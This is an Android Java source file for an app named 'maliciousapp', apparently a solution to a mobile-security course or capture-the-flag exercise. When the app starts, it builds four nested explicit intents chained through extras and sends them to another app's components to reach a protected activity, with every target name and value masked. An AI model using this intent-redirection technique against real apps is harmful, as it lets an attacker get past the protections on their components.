package com.example.maliciousapp;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {
    public static String TAG = "MOBIOTSEC";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
    }

    @Override
    protected void onStart() {
        super.onStart();
        String chain1 = "**********";
        String chain2 = "**********";
        String chain3 = "**********";

        Intent intent1 = new Intent();
        intent1.setComponent(new ComponentName("**********", "**********"));
        intent1.putExtra("**********", chain1);

        Intent intent2 = new Intent();
        intent2.setComponent(new ComponentName("**********", "**********"));
        intent2.putExtra("**********", chain2);
        intent2.putExtra("**********", "**********");

        Intent intent3 = new Intent();
        intent3.setComponent(new ComponentName("**********", "**********"));
        intent3.putExtra("**********", chain3);
        intent3.putExtra("**********", "**********");

        Intent intent4 = new Intent();
        intent4.setComponent(new ComponentName("**********", "**********"));

        intent1.putExtra("inception", intent2);
        intent2.putExtra("inner", intent3);
        intent3.putExtra("nested", intent4);

        startActivity(intent1);

    }
}